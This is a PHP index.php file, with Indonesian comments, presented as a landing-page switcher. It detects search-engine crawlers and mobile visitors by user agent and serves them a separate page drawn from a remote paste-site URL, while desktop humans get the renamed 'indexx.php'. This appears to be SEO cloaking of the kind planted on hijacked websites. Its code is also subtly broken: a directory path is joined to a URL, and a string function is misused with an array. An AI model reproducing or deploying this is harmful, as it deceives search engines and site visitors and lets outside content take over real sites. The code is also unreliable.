<?php
/**
 * index.php - Smart Landing Page Switcher
 * Menampilkan landingpage khusus untuk bot/crawler & mobile visitor
 * 
 * Catatan keamanan penting:
 * → JANGAN include file dari https:// URL → rawan injection & SSRF
 * → Simpan file landing di server sendiri (contoh: landing.php atau templates/landing.php)
 */

// ================= KONFIGURASI =================

define('BOT_LANDING_FILE', __DIR__ . 'https://paste-ini.pages.dev/raw/ucojdo35');      // file lokal yang ditampilkan ke bot & mobile
define('DEFAULT_FILE',     __DIR__ . '/indexx.php');          // file normal untuk human desktop

// Daftar bot/crawler yang dianggap "baik" (search engine + beberapa AI crawler umum 2025–2026)
const GOOD_BOTS = [
    'Googlebot', 'Googlebot-Image', 'Googlebot-News', 'Googlebot-Video',
    'Google-InspectionTool', 'GoogleOther', 'Google-Extended', 'APIs-Google',
    'AdsBot-Google', 'Mediapartners-Google', 'FeedFetcher-Google',
    'Google Favicon', 'Storebot-Google',

    'Bingbot', 'bingpreview',
    'Slurp',                    // Yahoo
    'DuckDuckBot',
    'YandexBot',
    'Baiduspider',
    'Sogou',
    'facebookexternalhit',
    'Twitterbot', 'TwitterExternalHit',
    'LinkedInBot',
    'Pinterestbot',
    'TelegramBot',
    // Tambah AI crawler jika ingin (opsional)
    // 'GPTBot', 'ChatGPT-User', 'anthropic-ai', 'ClaudeBot', 'PerplexityBot',
];

// Daftar keyword mobile (cukup bagus untuk kebanyakan kasus)
const MOBILE_KEYWORDS = [
    'Mobile', 'Android', 'iPhone', 'iPad', 'iPod', 'Windows Phone',
    'Kindle', 'Silk/', 'BlackBerry', 'Opera Mini', 'Opera Mobi',
    'webOS', 'SymbianOS',
];

// ================= FUNGSI =================

function isBot(string $ua): bool {
    $ua = strtolower($ua);

    foreach (GOOD_BOTS as $bot) {
        if (str_contains($ua, strtolower($bot))) {
            return true;
        }
    }

    // Optional: keyword umum crawler (jika ingin lebih longgar)
    // return preg_match('/(bot|crawl|spider|slurp|mediapartners|adsbot)/i', $ua) === 1;

    return false;
}

function isMobile(string $ua): bool {
    $ua = strtolower($ua);
    foreach (MOBILE_KEYWORDS as $kw) {
        if (str_contains($ua, strtolower($kw))) {
            return true;
        }
    }
    return false;
}

/**
 * Verifikasi Googlebot secara lebih akurat (anti-spoofing)
 * Hanya jalankan jika benar-benar penting (karena ada overhead DNS lookup)
 */
function isVerifiedGooglebot(string $ua, string $ip): bool {
    if (!str_contains(strtolower($ua), 'googlebot')) {
        return false;
    }

    $hostname = gethostbyaddr($ip);
    if ($hostname === $ip) {
        return false; // reverse DNS gagal
    }

    $hostname = strtolower($hostname);
    return str_ends_with($hostname, ['.googlebot.com', '.google.com'])
        && gethostbyname($hostname) === $ip; // forward lookup harus cocok
}

// ================= MAIN LOGIC =================

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

$is_bot   = isBot($ua);
// $is_google_verified = isVerifiedGooglebot($ua, $ip); // uncomment jika ingin verifikasi ketat

$is_mobile = isMobile($ua);

// Kondisi: bot ATAU mobile → tampilkan landing khusus
if ($is_bot || $is_mobile) {
    // Jika ingin verifikasi Googlebot ketat:
    // if ($is_bot && str_contains(strtolower($ua), 'googlebot') && !$is_google_verified) {
    //     // fake googlebot → anggap manusia biasa / blokir
    //     $is_bot = false;
    // }

    if (file_exists(BOT_LANDING_FILE)) {
        include BOT_LANDING_FILE;
    } else {
        // fallback: redirect atau tampilkan pesan
        header('Location: https://example.com/landing-fallback', true, 302);
        // atau: http_response_code(503); echo "Maintenance..."; 
    }
    exit;
}

// Default: human desktop
if (file_exists(DEFAULT_FILE)) {
    include DEFAULT_FILE;
} else {
    http_response_code(500);
    echo "Internal Server Error - Main file missing.";
}
exit;